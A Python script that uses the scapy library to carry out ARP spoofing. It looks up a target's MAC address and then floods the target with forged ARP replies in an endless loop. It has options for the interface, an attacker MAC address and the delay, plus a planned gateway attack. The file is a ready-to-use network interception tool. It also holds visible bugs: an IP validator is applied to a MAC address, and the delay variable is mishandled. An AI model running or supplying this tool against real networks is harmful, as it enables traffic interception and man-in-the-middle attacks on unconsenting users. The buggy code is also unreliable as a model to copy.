from scapy.all import *
import argparse

import time

ARP_ISAT_CODE = 2
DELAY_TIME = 0.5

def spoof(args : dict):

    #"""
    #param args -> arguments supported: interface (assuming valid),source,delay,gw,target(required)
    #"""

    #get target mac that needed for the attack. 
    target_mac = getMACbyIP(args['target'][0])


    
    if target_mac is None or not validateIpAddress(target_mac):
        print("ip target not found ")
        return

    #crate the arp packet
    arp_isat_packet = Ether(dst=target_mac)/ARP(op=ARP_ISAT_CODE,pdst=args['target'][0],psrc=args['target'][1])

    if args['delay'] is not None:
        DELAY_TIME = args['delay']
    if args["src"] is not None:
        arp_isat_packet[Ether].src = args["src"]

    #send the arp's packets to the target every DELAY_TIME sec
    while(True):
        sendp(arp_isat_packet)
        time.sleep(DELAY_TIME)
    

def getMACbyIP(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    response = srp1(arp_request, timeout=1, verbose=False)
    if response:
        return(response.src)

def validateIpAddress(address):
    return [0<=int(x)<256 for x in re.split('\.',re.match(r'^\d+\.\d+\.\d+\.\d+$',address).group(0))].count(True)==4


def main():
    parser = argparse.ArgumentParser(description="Spoof ARP tables")
    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-s","--src", help="The address you want for the attacker")
    parser.add_argument("-d","--delay", type=int, help="Delay (in seconds) between messages")
    parser.add_argument("-gw", action='store_true', help="should GW be attacked as well")
    parser.add_argument("-t","--target", help="IP of target",nargs=2,required=True)
    #TODO: check if the ip's valid


    #TODO: add gw suppurt
    #    gw = conf.route.route("0.0.0.0")[2]
    
    args = parser.parse_args()
    spoof(vars(args))


if __name__ == "__main__":
    main()                                                                     

